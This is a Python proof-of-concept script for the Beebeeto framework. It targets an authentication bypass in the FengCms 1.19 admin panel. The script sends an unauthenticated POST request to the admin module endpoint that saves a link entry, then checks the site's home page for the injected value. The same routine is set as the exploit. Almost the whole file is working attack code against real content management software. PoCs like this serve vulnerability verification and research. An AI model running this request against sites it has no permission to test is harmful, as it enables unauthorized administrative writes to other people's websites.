#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import hashlib
import urllib2

from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0068',
            'name': 'FengCms 1.19 /admin.php 登录绕过漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'FengCms',
            'vul_version': ['1.19'],
            'type': 'Login Bypass',
            'tag': ['FengCms漏洞', '登录绕过漏洞', '/admin.php'],
            'desc': '由于后台操作对用户验证逻辑不严谨，导致后台操作可对未登录者开放。',
            'references': ['http://wooyun.org/bugs/wooyun-2014-066420',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        test_md5 = hashlib.new('md5','ahfgoeaihfo').hexdigest()
        post_data = "name={md5}&url=http%3A%2F%2Fabcde.com&time=1404798339&status=1".format(md5=test_md5)
        verify_url = args['options']['target'] + '/admin/index.php?controller=module&project=friend&operate=save'
        req = urllib2.Request(verify_url, data=post_data, headers=ForgeHeaders().headers)
        urllib2.urlopen(req)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Data: ' + post_data
        content = urllib2.urlopen(urllib2.Request(args['options']['target'])).read()
        if test_md5 in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
